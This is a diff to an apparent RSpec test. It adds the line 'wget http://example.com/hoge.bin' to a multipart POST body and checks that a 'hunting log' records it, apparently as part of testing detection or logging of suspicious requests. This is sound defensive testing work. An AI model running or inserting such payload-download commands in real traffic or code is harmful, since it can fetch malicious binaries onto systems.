@@ -53,6 +53,7 @@ Content-Id: <soap-start>\r
 Content-Transfer-Encoding: 7bit\r
 \r
 foo\r
+wget http://example.com/hoge.bin\r
 --AaB03x--\r
 EOF
       post 'http://example.com', input
@@ -66,6 +67,10 @@ EOF
       expect(decoded_req).to include("Content-Length: #{input.length}")
       expect(decoded_req).to include("Content-Type: application/x-www-form-urlencoded")
       expect(decoded_req).to include("foo")
+
+      @hunting_log.rewind
+      hunting_log = @hunting_log.read
+      expect(hunting_log).to include("wget http://example.com/hoge.bin")
     end
   end
 end
